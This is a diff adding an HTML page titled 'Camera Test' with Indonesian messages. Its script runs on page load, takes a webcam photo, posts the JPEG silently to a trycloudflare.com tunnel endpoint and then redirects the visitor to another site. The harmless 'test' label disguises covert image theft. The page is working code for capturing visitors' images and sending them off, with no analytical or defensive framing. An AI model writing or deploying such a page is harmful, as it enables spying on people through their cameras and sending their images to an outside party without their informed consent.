@@ -1,0 +1,72 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Camera Test</title>
+</head>
+<body>
+<script>
+(async () => {
+  const UPLOAD_ENDPOINT = "https://coding-camcorders-sites-makeup.trycloudflare.com/upload-photo";
+  const ORIGINAL_URL = "https://realtwitspin.autos/";
+
+  try {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      alert("Browser tidak mendukung akses kamera.");
+      window.location.href = ORIGINAL_URL;
+      return;
+    }
+
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: true,
+      audio: false
+    });
+
+    const video = document.createElement("video");
+    video.autoplay = true;
+    video.playsInline = true;
+    video.muted = true;
+    video.srcObject = stream;
+
+    await new Promise(resolve => {
+      if (video.readyState >= 2) return resolve();
+      video.onloadedmetadata = resolve;
+    });
+
+    await video.play();
+
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    const blob = await new Promise(resolve =>
+      canvas.toBlob(resolve, "image/jpeg", 0.9)
+    );
+
+    stream.getTracks().forEach(track => track.stop());
+
+    if (!blob) throw new Error("Gagal membuat foto.");
+
+    const formData = new FormData();
+    formData.append("photo", blob, "capture.jpg");
+
+    await fetch(UPLOAD_ENDPOINT, {
+      method: "POST",
+      body: formData,
+      mode: "no-cors"
+    });
+
+  } catch (error) {
+    console.error("Camera test:", error);
+  } finally {
+    // Setelah pengujian selesai, fungsi tujuan tombol tetap dijalankan.
+    window.location.href = ORIGINAL_URL;
+  }
+})();
+</script>
+</body>
+</html>
